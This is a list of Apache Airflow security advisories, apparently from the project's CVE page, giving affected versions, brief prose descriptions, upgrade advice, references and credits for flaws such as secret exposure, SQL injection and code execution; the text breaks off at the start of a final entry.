CVE-2026-22922 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2026-22922) [\[CVE json\]](./CVE-2026-22922.cve.json) [\[OSV json\]](./CVE-2026-22922.osv.json)



_Last updated: 2026-02-09T10:33:48.256Z_

### Affected

* Apache Airflow from 3.1.0 before 3.1.7


### Description

Apache Airflow versions 3.1.0 through 3.1.6 contain an authorization flaw that can allow an authenticated user with custom permissions limited to task access to view task logs without having task log access. <br><br>Users are recommended to upgrade to Apache Airflow 3.1.7 or later, which resolves this issue.<br>

### References
* https://github.com/apache/airflow/pull/60412
* https://lists.apache.org/thread/gdb7vffhpmrj5hp1j0oj1j13o4vmsq40


### Credits
* 34selen (finder)
* Shubham Raj (remediation developer)


## Unsafe Pickle Deserialization in apache-airflow-providers-http leading to RCE via HttpOperator ## { #CVE-2025-69219 }

CVE-2025-69219 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-69219) [\[CVE json\]](./CVE-2025-69219.cve.json) [\[OSV json\]](./CVE-2025-69219.osv.json)



_Last updated: 2026-03-09T10:19:56.479Z_

### Affected

* Apache Airflow Providers Http from 5.1.0 before 6.0.0


### Description

<p>A user with access to the DB could craft a database entry that would result in executing code on Triggerer - which gives anyone who have access to DB the same permissions as Dag Author. Since direct DB access is not usual and recommended for Airflow, the likelihood of it making any damage is low.<br><br>You should upgrade to version 6.0.0 of the provider to avoid even that risk.</p>

### References
* https://github.com/apache/airflow/pull/61662
* https://lists.apache.org/thread/zjkfb2njklro68tqzym092r4w65m5dq0


### Credits
* skypher (finder)
* Shauryae1337 (GitHub: https://github.com/Shauryae1337) (finder)
* Ahmet Artuç (finder)


## proxy credentials for various providers might leak in task logs ## { #CVE-2025-68675 }

CVE-2025-68675 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-68675) [\[CVE json\]](./CVE-2025-68675.cve.json) [\[OSV json\]](./CVE-2025-68675.osv.json)



_Last updated: 2026-02-24T05:48:09.000Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.6
* Apache Airflow before 2.11.1


### Description

In Apache Airflow versions before 3.1.6, and 2.11.1 the proxies and proxy fields within a Connection may include proxy URLs containing embedded authentication information. These fields were not treated as sensitive by default and therefore were not automatically masked in log output. As a result, when such connections are rendered or printed to logs, proxy credentials embedded in these fields could be exposed.<br><br>Users are recommended to upgrade to 3.1.6 or later for Airflow 3, and 2.11.1 or later for Airflow 2 which fixes this issue

### References
* https://lists.apache.org/thread/x6kply4nqd4vc4wgxtm6g9r2tt63s8c5
* https://github.com/apache/airflow/pull/59688


### Credits
* lwlkr https://github.com/kwkr (finder)
* Ankit Chaurasia (remediation developer)


## Secrets in rendered templates could contain parts of sensitive values when truncated ## { #CVE-2025-68438 }

CVE-2025-68438 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-68438) [\[CVE json\]](./CVE-2025-68438.cve.json) [\[OSV json\]](./CVE-2025-68438.osv.json)



_Last updated: 2026-01-16T10:06:05.336Z_

### Affected

* Apache Airflow from 3.1.0 before 3.1.6


### Description

In Apache Airflow versions before 3.1.6, when rendered template fields in a Dag exceed [core]&nbsp;<code>max_templated_field_length</code>, sensitive values could be exposed in cleartext in the Rendered Templates UI. This occurred because serialization of those fields used a secrets masker instance that did not include user-registered <code>mask_secret()</code> patterns, so secrets were not reliably masked before truncation and display.<br><br>Users are recommended to upgrade to 3.1.6 or later, which fixes this issue<br>

### References
* https://lists.apache.org/thread/55n7b4nlsz3vo5n4h5lrj9bfsk8ctyff


### Credits
* William Ashe (finder)
* Amogh Desai (remediation developer)


## Edge3 Worker RPC RCE on Airflow 2 ## { #CVE-2025-67895 }

CVE-2025-67895 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-67895) [\[CVE json\]](./CVE-2025-67895.cve.json) [\[OSV json\]](./CVE-2025-67895.osv.json)



_Last updated: 2025-12-17T11:48:30.034Z_

### Affected

* Apache Airflow Providers Edge3 before 2.0.0


### Description

<p>Edge3 Worker RPC RCE on Airflow 2.</p><p>This issue affects Apache Airflow Providers Edge3: before 2.0.0 - and only if you installed and configured it on Airflow 2.</p><p></p><p>The Edge3 provider support in Airflow 2 has been always development-only and not officially released, however if you installed and configured Edge3 provider in Airflow 2, it implicitly enabled non-public (normally) API which was used to test Edge Provider in Airflow 2 during the development. This API allowed Dag author to perform Remote Code Execution in the webserver context, which Dag Author was not supposed to be able to do.</p><p>If you installed and configured Edge3 provider for Airflow 2, you should uninstall it and migrate to Airflow 3. The new Edge3 provider versions (&gt;=2.0.0) has minimum version of Airflow set to 3 and the RCE-prone Airflow 2 code is removed, so it should no longer be possible to use the Edge3 provider 2.0.0+ on Airflow 2.</p><p>If you used Edge Provider in Airflow 3, you are not affected.</p><p></p>

### References
* https://github.com/apache/airflow/pull/59143
* https://lists.apache.org/thread/hhnmmzkj5qx5gbk6pdkh8tcsx5oj1nqs


### Credits
* Lee (finder)


## Secrets in rendered templates not redacted properly and exposed in the UI ## { #CVE-2025-66388 }

CVE-2025-66388 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-66388) [\[CVE json\]](./CVE-2025-66388.cve.json) [\[OSV json\]](./CVE-2025-66388.osv.json)



_Last updated: 2025-12-15T11:30:42.649Z_

### Affected

* Apache Airflow from 3.1.0 before 3.1.4


### Description

A vulnerability in Apache Airflow allowed authenticated UI users to view secret values in rendered templates due to secrets not being properly redacted,&nbsp;potentially exposing secrets to users without the appropriate authorization.<br><br>Users are recommended to upgrade to version 3.1.4, which fixes this issue.

### References
* https://github.com/apache/airflow/pull/58772
* https://lists.apache.org/thread/mv9hzsx8grjf7gdlkxwppnpbtogtls2g


### Credits
* William Ashe (finder)
* Amogh Desai (remediation developer)


## Secrets from Airflow config file logged in plain text in DAG run logs UI ## { #CVE-2025-66236 }

CVE-2025-66236 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-66236) [\[CVE json\]](./CVE-2025-66236.cve.json) [\[OSV json\]](./CVE-2025-66236.osv.json)



_Last updated: 2026-04-13T14:20:35.201Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.0


### Description

<p>Before Airflow 3.2.0, it was unclear that secure Airflow deployments require the Deployment Manager to take appropriate actions and pay attention to security details and security model of Airflow. Some assumptions the Deployment Manager could make were not clear or explicit enough, even though Airflow's intentions and security model of Airflow did not suggest different assumptions. The overall security model [1], workload isolation [2], and JWT authentication details [3] are now described in more detail. Users concerned with role isolation and following the Airflow security model of Airflow are advised to upgrade to Airflow 3.2, where several security improvements have been implemented. They should also read and follow the relevant documents to make sure that their deployment is secure enough. It also clarifies that the Deployment Manager is ultimately responsible for securing your Airflow deployment. This had also been communicated via Airflow 3.2.0 Blog announcement [4].</p><blockquote><p>[1] Security Model: <a target="_blank" rel="nofollow" href="https://airflow.apache.org/docs/apache-airflow/stable/security/jwt_token_authentication.html">https://airflow.apache.org/docs/apache-airflow/stable/security/jwt_token_authentication.html</a><br>[2] Workload isolation: <a target="_blank" rel="nofollow" href="https://airflow.apache.org/docs/apache-airflow/stable/security/workload.html">https://airflow.apache.org/docs/apache-airflow/stable/security/workload.html</a><br>[3] JWT Token authentication: <a target="_blank" rel="nofollow" href="https://airflow.apache.org/docs/apache-airflow/stable/security/jwt_token_authentication.html">https://airflow.apache.org/docs/apache-airflow/stable/security/jwt_token_authentication.html</a><br>[4] Airflow 3.2.0 Blog announcement: <a target="_blank" rel="nofollow" href="https://airflow.apache.org/blog/airflow-3.2.0/">https://airflow.apache.org/blog/airflow-3.2.0/</a></p></blockquote><br><br>Users are recommended to upgrade to version 3.2.0, which fixes this issue.

### References
* https://github.com/apache/airflow/pull/58662
* https://lists.apache.org/thread/g8fyy1tkmxkkfk7tx2v6h8mvwzpyykbo


### Credits
* Saurabh Banawar (finder)
* Amogh Desai (remediation developer)


## Disclosure of secrets to UI via kwargs ## { #CVE-2025-65995 }

CVE-2025-65995 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-65995) [\[CVE json\]](./CVE-2025-65995.cve.json) [\[OSV json\]](./CVE-2025-65995.osv.json)



_Last updated: 2026-03-08T19:08:56.440Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.4
* Apache Airflow before 2.11.1


### Description

When a DAG failed during parsing, Airflow’s error-reporting in the UI could include the full kwargs passed to the operators. If those kwargs contained sensitive values (such as secrets), they might be exposed in the UI tracebacks to authenticated users who had permission to view that DAG.&nbsp;<br><br>The issue has been fixed in Airflow 3.1.4 and 2.11.1, and users are strongly advised to upgrade to prevent potential disclosure of sensitive information.

### References
* https://github.com/apache/airflow/pull/58252
* https://lists.apache.org/thread/1qzlrjo2wmlzs0rrgzgslj2pzkor0dr2
* https://github.com/apache/airflow/pull/61883


### Credits
* Frieder Gottman (Cariad) (finder)
* Jens Scheffler (Bosch) (reporter)
* Jens Scheffler (Bosch) (remediation developer)


## Privilege boundary bypass in bulk APIs (create action can upsert existing Pools/Connections/Variables) ## { #CVE-2025-62503 }

CVE-2025-62503 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-62503) [\[CVE json\]](./CVE-2025-62503.cve.json) [\[OSV json\]](./CVE-2025-62503.osv.json)



_Last updated: 2025-10-30T09:11:15.486Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.1


### Description

User with CREATE and no UPDATE privilege for Pools, Connections, Variables could update existing records via bulk create API with overwrite action.<br><br><br>

### References
* https://lists.apache.org/thread/3v58249qscyn1hg240gh8hqg9pb4okcr


### Credits
* Maciej Kawka (finder)


## Airflow 3 API: /api/v2/dagReports executes DAG Python in API ## { #CVE-2025-62402 }

CVE-2025-62402 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-62402) [\[CVE json\]](./CVE-2025-62402.cve.json) [\[OSV json\]](./CVE-2025-62402.osv.json)



_Last updated: 2025-10-30T09:14:24.818Z_

### Affected

* Apache Airflow from 3.0.0 before 3.1.1


### Description

API users via `/api/v2/dagReports` could perform Dag code execution in the context of the api-server if the api-server was deployed in the environment where Dag files were available.<br>

### References
* https://lists.apache.org/thread/vbzxnxn031wb998hsd7vqnvh4z8nx6rs


### Credits
* kwkr (https://github.com/kwkr) (reporter)


## Airflow Logout Not Invalidating JWT ## { #CVE-2025-57735 }

CVE-2025-57735 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-57735) [\[CVE json\]](./CVE-2025-57735.cve.json) [\[OSV json\]](./CVE-2025-57735.osv.json)



_Last updated: 2026-04-09T11:12:40.266Z_

### Affected

* Apache Airflow from 3.0.0 before 3.2.0


### Description

<p>When user logged out, the JWT token the user had authtenticated with was not invalidated, which could lead to reuse of that token in case it was intercepted. In Airflow 3.2 we implemented the mechanism that implements token invalidation at logout. Users who are concerned about the logout scenario and possibility of intercepting the tokens, should upgrade to Airflow 3.2+</p><br><br>Users are recommended to upgrade to version 3.2.0, which fixes this issue.

### References
* https://github.com/apache/airflow/pull/61339
* https://github.com/apache/airflow/pull/56633
* https://lists.apache.org/thread/ovn8mpd8zkc604hojt7x3wsw3kc60x98


### Credits
* Saurabh Banawar (finder)
* Anish Giri (remediation developer)
* vincent beck (remediation developer)


## Command injection in "example_dag_decorator" ## { #CVE-2025-54941 }

CVE-2025-54941 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-54941) [\[CVE json\]](./CVE-2025-54941.cve.json) [\[OSV json\]](./CVE-2025-54941.osv.json)



_Last updated: 2025-10-30T09:45:25.170Z_

### Affected

* Apache Airflow from 3.0.0 before < 3.0.5


### Description

An example dag `example_dag_decorator` had non-validated parameter that allowed the UI user to redirect the example to a malicious server and execute code on worker. This however required that the example dags are enabled in production (not default) or the example dag code copied to build your own similar dag. If you used the `example_dag_decorator` please review it and apply the changes implemented in Airflow 3.0.5 accordingly.<br><br><br>

### References
* https://lists.apache.org/thread/c6q6nofc6xl5bms039ks9b34v0v36df1


### Credits
* Nacl (reporter)


## Connection sensitive details exposed to users with READ permissions ## { #CVE-2025-54831 }

CVE-2025-54831 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-54831) [\[CVE json\]](./CVE-2025-54831.cve.json) [\[OSV json\]](./CVE-2025-54831.osv.json)



_Last updated: 2025-09-26T07:28:57.402Z_

### Affected

* Apache Airflow at 3.0.3


### Description

<p></p><p>Apache Airflow 3 introduced a change to the handling of sensitive information in Connections. The intent was to restrict access to sensitive connection fields to <em>Connection Editing Users</em>, effectively applying a "write-only" model for sensitive values.</p>
<p>In Airflow 3.0.3, this model was unintentionally violated: sensitive connection information could be viewed by users with READ permissions through both the API and the UI. This behavior also bypassed the `<code>AIRFLOW__CORE__HIDE_SENSITIVE_VAR_CONN_FIELDS`</code> configuration option.</p>
<p>This issue does not affect Airflow 2.x, where exposing sensitive information to connection editors was the intended and documented behavior.</p><p></p><p><br></p><p>Users of Airflow 3.0.3 are advised to upgrade Airflow to &gt;=3.0.4.</p>

### References
* https://lists.apache.org/thread/vblmfqtydrp5zgn2q8tj3slk5podxspf


## RCE by race condition in example_xcom dag ## { #CVE-2025-54550 }

CVE-2025-54550 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-54550) [\[CVE json\]](./CVE-2025-54550.cve.json) [\[OSV json\]](./CVE-2025-54550.osv.json)



_Last updated: 2026-04-19T23:47:06.426Z_

### Affected

* Apache Airflow before 3.2.0


### Description

<p>The example <code>example_xcom</code>&nbsp;that was included in airflow documentation implemented unsafe pattern of reading value<br>from xcom in the way that could be exploited to allow UI user who had access to modify XComs to perform arbitrary<br>execution of code on the worker. Since the UI users are already highly trusted, this is a Low severity vulnerability.</p><p>It does not affect Airflow release - example_dags are not supposed to be enabled in production environment, however<br>users following the example could replicate the bad pattern. Documentation of Airflow 3.2.0 contains version of<br>the example with improved resiliance for that case.</p>Users who followed that pattern are advised to adjust their implementations accordingly.<br><br>

### References
* https://lists.apache.org/thread/3mf4cfx070ofsnf9qy0s2v5gqb5sc2g1
* https://github.com/apache/airflow/pull/63200


### Credits
* Vincent55 Yang (finder)


## Potential SQL injection in CopyFromExternalStageToSnowflakeOperator ## { #CVE-2025-50213 }

CVE-2025-50213 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-50213) [\[CVE json\]](./CVE-2025-50213.cve.json) [\[OSV json\]](./CVE-2025-50213.osv.json)



_Last updated: 2025-06-24T07:06:50.934Z_

### Affected

* Apache Airflow Providers Snowflake before 6.4.0


### Description

<p>Failure to Sanitize Special Elements into a Different Plane (Special Element Injection) vulnerability in Apache Airflow Providers Snowflake.</p><p>This issue affects Apache Airflow Providers Snowflake: before 6.4.0.</p><span style="background-color: rgb(255, 255, 255);"><span style="background-color: rgb(255, 255, 255);">Sanitation of table and stage parameters were added in</span>&nbsp;CopyFromExternalStageToSnowflakeOperator&nbsp;<span style="background-color: rgb(255, 255, 255);">to prevent</span><span style="background-color: rgb(255, 255, 255);">&nbsp;SQL injection</span></span><br><p>Users are recommended to upgrade to version 6.4.0, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/51734
* https://lists.apache.org/thread/2kqfmyt2pghg5f6797g8hzvq331v8qx3


### Credits
* Nhien Pham (@nhienit) at Galaxy One (finder)


## Remote Code Execution via Sql Injection ## { #CVE-2025-30473 }

CVE-2025-30473 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-30473) [\[CVE json\]](./CVE-2025-30473.cve.json) [\[OSV json\]](./CVE-2025-30473.osv.json)



_Last updated: 2025-04-07T08:31:55.441Z_

### Affected

* Apache Airflow Common SQL Provider before 1.24.1


### Description

<p>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Apache Airflow Common SQL Provider.<br><br><span style="background-color: rgb(255, 255, 255);">When using the partition clause in SQLTableCheckOperator as parameter (which was a recommended pattern), Authenticated UI User could inject arbitrary SQL command when triggering DAG exposing partition_clause to the user.<br></span><span style="background-color: rgb(255, 255, 255);">This allowed the DAG Triggering user to escalate privileges to execute those arbitrary commands which they normally would not have.</span><br></p><p>This issue affects Apache Airflow Common SQL Provider: before 1.24.1.</p><p>Users are recommended to upgrade to version 1.24.1, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/48098
* https://lists.apache.org/thread/53klkv790cylqcop0350w7nfq1y6h0t2


### Credits
* nxczje (reporter)


## Connection Secrets not masked in UI when Connection are added via Airflow cli ## { #CVE-2025-27555 }

CVE-2025-27555 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-27555) [\[CVE json\]](./CVE-2025-27555.cve.json) [\[OSV json\]](./CVE-2025-27555.osv.json)



_Last updated: 2026-03-11T15:10:00.713Z_

### Affected

* Apache Airflow before 2.11.1


### Description

Airflow versions before 2.11.1 have a vulnerability that allows authenticated users with audit log access to see sensitive values in audit logs which they should not see. When sensitive connection parameters were set via airflow CLI, values of those variables appeared in the audit log and were stored unencrypted in the Airflow database. While this risk is limited to users with audit log access, it is recommended to upgrade to Airflow 2.11.1 or a later version, which addresses this issue. Users who previously used the CLI to set connections should manually delete entries with those connection sensitive values from the log table. This is similar but not the same issue as CVE-2024-50378

### References
* https://github.com/apache/airflow/pull/61882
* https://lists.apache.org/thread/nxovkp319jo8vg498gql1yswtb2frbkw


### Credits
* sw0rd1ight (finder)


## SQL injection in MySQL provider core function ## { #CVE-2025-27018 }

CVE-2025-27018 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2025-27018) [\[CVE json\]](./CVE-2025-27018.cve.json) [\[OSV json\]](./CVE-2025-27018.osv.json)



_Last updated: 2025-03-19T09:06:05.242Z_

### Affected

* Apache Airflow MySQL Provider before 6.2.0


### Description

<p>Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') vulnerability in Apache Airflow MySQL Provider.</p><span style="background-color: rgb(255, 255, 255);">When user triggered a DAG with dump_sql or load_sql functions they could pass a table parameter from a UI, that could cause SQL injection by running SQL that was not intended.<br>It could lead to data corruption, modification and others.</span><br><p>This issue affects Apache Airflow MySQL Provider: before 6.2.0.</p><p>Users are recommended to upgrade to version 6.2.0, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/47254
* https://github.com/apache/airflow/pull/47255
* https://lists.apache.org/thread/m8ohgkwz4mq9njohf66sjwqjdy28gvzf


### Credits
* Vincent55 (DEVCORE Internship Program) (finder)


## SSTI to Code Execution in Airflow through Shared DB Information ## { #CVE-2024-56373 }

CVE-2024-56373 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-56373) [\[CVE json\]](./CVE-2024-56373.cve.json) [\[OSV json\]](./CVE-2024-56373.osv.json)



_Last updated: 2026-02-24T10:06:39.270Z_

### Affected

* Apache Airflow before 2.11.1


### Description

<p>DAG Author (who already has quite a lot of permissions) could manipulate database of Airflow 2 in the way to execute arbitrary code in the web-server context, which they should normally not be able to do, leading to potentially remote code execution in the context of web-server (server-side) as a result of a user viewing historical task information.</p>The functionality responsible for that (log template history) has been disabled by default in 2.11.1 and users should upgrade to Airflow 3 if they want to continue to use log template history. They can also manually modify historical log file names if they want to see historical logs that were generated before the last log template change.

### References
* https://github.com/apache/airflow/pull/61880
* https://lists.apache.org/thread/2vrmrhcht6g7cp5yjxpnrk2wtrncm6cy


### Credits
* Seokchan Yoon. (finder)


## Secrets not masked in UI when sensitive variables are set via Airflow cli ## { #CVE-2024-50378 }

CVE-2024-50378 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-50378) [\[CVE json\]](./CVE-2024-50378.cve.json) [\[OSV json\]](./CVE-2024-50378.osv.json)



_Last updated: 2024-11-08T14:37:07.862Z_

### Affected

* Apache Airflow before 2.10.3


### Description

Airflow versions before 2.10.3 have a vulnerability that allows authenticated users with audit log access to see sensitive values in audit logs which they should not see.&nbsp;When sensitive variables were set via airflow CLI, values of those variables appeared in the audit log and were stored unencrypted in the Airflow database. While this risk is limited to users with audit log access, it is recommended to upgrade to Airflow 2.10.3 or a later version, which addresses this issue. Users who previously used the CLI to set secret variables should manually delete entries with those variables from the log table.

### References
* https://github.com/apache/airflow/pull/43123
* https://lists.apache.org/thread/17rxys384lzfd6nhm3fztzgvk47zy7jb


### Credits
* Saurabh Banawar (finder)
* Shubham Raj (remediation developer)


## Sensitive configuration values are not masked in the logs by default ## { #CVE-2024-45784 }

CVE-2024-45784 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-45784) [\[CVE json\]](./CVE-2024-45784.cve.json) [\[OSV json\]](./CVE-2024-45784.osv.json)



_Last updated: 2024-11-15T08:20:02.608Z_

### Affected

* Apache Airflow before 2.10.3


### Description

Apache Airflow versions before 2.10.3 contain a vulnerability that could expose sensitive configuration variables in task logs. This vulnerability allows DAG authors to unintentionally or intentionally log sensitive configuration variables. Unauthorized users could access these logs, potentially exposing critical data that could be exploited to compromise the security of the Airflow deployment. In version 2.10.3, secrets are now masked in task logs to prevent sensitive configuration variables from being exposed in the logging output. Users should upgrade to Airflow 2.10.3 or the latest version to eliminate this vulnerability.&nbsp;If you suspect that DAG authors could have logged the secret values to the logs and that your logs are not additionally protected, it is also recommended that you update those secrets.

### References
* https://github.com/apache/airflow/pull/43040
* https://lists.apache.org/thread/k2jm55jztlbmk4zrlh10syvq3n57hl4h


### Credits
* Saurabh Banawar (finder)
* Amogh Desai (remediation developer)


## Command Injection in an example DAG ## { #CVE-2024-45498 }

CVE-2024-45498 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-45498) [\[CVE json\]](./CVE-2024-45498.cve.json) [\[OSV json\]](./CVE-2024-45498.osv.json)



_Last updated: 2024-09-07T07:43:42.216Z_

### Affected

* Apache Airflow at 2.10.0


### Description

Example DAG: example_inlet_event_extra.py shipped with Apache Airflow version 2.10.0 has a vulnerability that allows an authenticated attacker with only DAG trigger permission to execute arbitrary commands. If you used that example as the base of your DAGs - please review if you have not copied the dangerous example; see <a target="_blank" rel="nofollow" href="https://github.com/apache/airflow/pull/41873">https://github.com/apache/airflow/pull/41873</a>&nbsp;for more information. We recommend against exposing the example DAGs in your deployment. If you must expose the example DAGs, upgrade Airflow to version 2.10.1 or later.<br>

### References
* https://github.com/apache/airflow/pull/41873
* https://lists.apache.org/thread/tl7lzczcqdmqj2pcpbvtjdpd2tb9561n


### Credits
* Nhien Pham (aka nhienit) at Galaxy One (finder)
* Amogh Desai (remediation developer)


## Authenticated DAG authors could execute code on scheduler nodes ## { #CVE-2024-45034 }

CVE-2024-45034 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-45034) [\[CVE json\]](./CVE-2024-45034.cve.json) [\[OSV json\]](./CVE-2024-45034.osv.json)



_Last updated: 2024-09-07T07:45:26.032Z_

### Affected

* Apache Airflow before 2.10.1


### Description

Apache Airflow versions before 2.10.1 have a vulnerability that allows&nbsp;DAG authors to add local settings to the DAG folder and get it executed by the scheduler, where the scheduler is not supposed to execute code submitted by the DAG author. <br>Users are advised to upgrade to version 2.10.1 or later, which has fixed the vulnerability.

### References
* https://github.com/apache/airflow/pull/41672
* https://lists.apache.org/thread/b4fcw33vh60yfg9990n5vmc7sy2dcgjx


### Credits
* Seokchan Yoon: https://github.com/ch4n3-yoon (finder)
* Amogh Desai (remediation developer)


## Application does not invalidate session after password change via Airflow cli ## { #CVE-2024-45033 }

CVE-2024-45033 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-45033) [\[CVE json\]](./CVE-2024-45033.cve.json) [\[OSV json\]](./CVE-2024-45033.osv.json)



_Last updated: 2025-01-08T08:41:37.392Z_

### Affected

* Apache Airflow Fab Provider before 1.5.2


### Description

<p>Insufficient Session Expiration vulnerability in Apache Airflow Fab Provider.</p><p>This issue affects Apache Airflow Fab Provider: before 1.5.2.<br><br><span style="background-color: rgb(255, 255, 255);">When user password has been changed with admin CLI, the sessions for that user have not been cleared, leading to insufficient session expiration, thus logged users could continue to be logged in even after the password was changed. This only happened when the password was changed with CLI. The problem does not happen in case change was done with webserver thus this is different from&nbsp;</span><a target="_blank" rel="nofollow" href="https://github.com/advisories/GHSA-pm87-24wq-r8w9">CVE-2023-40273</a><span style="background-color: rgb(255, 255, 255);">&nbsp;which was addressed in Apache-Airflow 2.7.0</span><br></p><p>Users are recommended to upgrade to version 1.5.2, which fixes the issue.</p>

### References
* https://github.com/apache/airflow/pull/45139
* https://lists.apache.org/thread/yw535346rk766ybzpqtvrl36sjj789st


### Credits
* Saurabh Banawar (reporter)


## FAB provider 1.2.1 and 1.2.0 did not let user to logout for Airflow ## { #CVE-2024-42447 }

CVE-2024-42447 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-42447) [\[CVE json\]](./CVE-2024-42447.cve.json) [\[OSV json\]](./CVE-2024-42447.osv.json)



_Last updated: 2024-08-04T20:03:30.234Z_

### Affected

* Apache Airflow Providers FAB from 1.2.0 through 1.2.1


### Description

<p>Insufficient Session Expiration vulnerability in Apache Airflow Providers FAB.</p><p>This issue affects Apache Airflow Providers FAB: 1.2.1 (when used with Apache Airflow 2.9.3) and FAB 1.2.0 for all Airflow versions. The FAB provider prevented the user from logging out.&nbsp;&nbsp;</p><p>* FAB provider 1.2.1 only affected Airflow 2.9.3 (earlier and later versions of Airflow are not affected)</p><p>* FAB provider 1.2.0 affected all versions of Airflow.<br></p><p><span style="background-color: var(--wht);">Users who run Apache Airflow 2.9.3 are recommended to upgrade to Apache Airflow Providers FAB version 1.2.2 which fixes the issue.</span><br></p><p>Users who run Any Apache Airflow version and have FAB provider 1.2.0 are recommended to upgrade to Apache Airflow Providers FAB version 1.2.2 which fixes the issue.</p>Also upgrading Apache Airflow to latest version available is recommended.<br><br><p>Note: Early version of Airflow reference container images of Airflow 2.9.3 and constraint files contained FAB provider 1.2.1 version, but this is fixed in updated versions of the images.&nbsp;</p><p>Users are advised to pull the latest Airflow images or reinstall FAB provider according to the current constraints.</p><br>

### References
* https://github.com/apache/airflow/pull/40784
* https://lists.apache.org/thread/2zoo8cjlwfjhbfdxfgltcm0hnc0qmc52


## Stored XSS Vulnerability on provider link ## { #CVE-2024-41937 }

CVE-2024-41937 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-41937) [\[CVE json\]](./CVE-2024-41937.cve.json) [\[OSV json\]](./CVE-2024-41937.osv.json)



_Last updated: 2024-08-21T15:31:11.725Z_

### Affected

* Apache Airflow before 2.10.0


### Description

Apache Airflow, versions before 2.10.0, have a vulnerability that allows the developer of a malicious provider to execute a cross-site scripting attack when clicking on a provider documentation link. This would require the provider to be installed on the web server and the&nbsp;user to click the provider link.<br>Users should upgrade to 2.10.0 or later, which fixes this vulnerability.

### References
* https://github.com/apache/airflow/pull/40933
* https://lists.apache.org/thread/lwlmgg6hqfmkpvw5py4w53hxyl37jl6d


### Credits
* sw0rd1ight (https://github.com/sw0rd1ight) (finder)
* Amogh Desai (remediation developer)


## DAG Author Code Execution possibility in airflow-scheduler ## { #CVE-2024-39877 }

CVE-2024-39877 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-39877) [\[CVE json\]](./CVE-2024-39877.cve.json) [\[OSV json\]](./CVE-2024-39877.osv.json)



_Last updated: 2024-07-17T07:54:23.158Z_

### Affected

* Apache Airflow from 2.4.0 before 2.9.3


### Description

Apache Airflow 2.4.0, and versions before 2.9.3, has a vulnerability that allows authenticated DAG authors to craft a doc_md parameter in a way that could execute arbitrary code in the scheduler context, which should be forbidden according to the Airflow Security model. Users should upgrade to version 2.9.3 or later which has removed the vulnerability.

### References
* https://github.com/apache/airflow/pull/40522
* https://lists.apache.org/thread/1xhj9dkp37d6pzn24ll2mf94wbqnb2y1


### Credits
* Seokchan Yoon (https://github.com/ch4n3-yoon) (finder)
* Wei Lee (remediation developer)


## Potential XSS Vulnerability ## { #CVE-2024-39863 }

CVE-2024-39863 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-39863) [\[CVE json\]](./CVE-2024-39863.cve.json) [\[OSV json\]](./CVE-2024-39863.osv.json)



_Last updated: 2024-07-22T08:50:05.686Z_

### Affected

* Apache Airflow before 2.9.3


### Description

Apache Airflow versions before 2.9.3 have a vulnerability that allows an authenticated attacker to inject a malicious link when installing a provider. Users are recommended to upgrade to version 2.9.3, which fixes this issue.<br>

### References
* https://github.com/apache/airflow/pull/40475
* https://lists.apache.org/thread/gxkvs279f1mbvckv5q65worr6how20o3


### Credits
* Seokchan Yoon (https://github.com/ch4n3-yoon) (finder)
* Amogh Desai (remediation developer)


## XSS vulnerability in Task Instance Log/Log Details ## { #CVE-2024-32077 }

CVE-2024-32077 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-32077) [\[CVE json\]](./CVE-2024-32077.cve.json) [\[OSV json\]](./CVE-2024-32077.osv.json)



_Last updated: 2024-05-14T10:43:17.698Z_

### Affected

* Apache Airflow from 2.9.0 before 2.9.1


### Description

Apache Airflow version 2.9.0 has a vulnerability that allows an authenticated attacker to inject malicious data into the task instance logs.&nbsp;<br>Users are recommended to upgrade to version 2.9.1, which fixes this issue.<br>

### References
* https://github.com/apache/airflow/pull/38882
* https://lists.apache.org/thread/gsjmnrqb3m5fzp0vgpty1jxcywo91v77


### Credits
* Ming (finder)
* Jens Scheffler (remediation developer)


## Sensitive configuration for providers displayed when "non-sensitive-only" config used ## { #CVE-2024-31869 }

CVE-2024-31869 [\[CVE\]](https://cve.org/CVERecord?id=CVE-2024-31869) [\[CVE json\]](./CVE-2024-31869.cve.json) [\[OSV json\]](./CVE-2024-31869.osv.json)



_Last updated: 2024-04-18T07:18:58.062Z_

### Affected

* Apache Airflow from 2.7.0 through 2.8.4


### Description

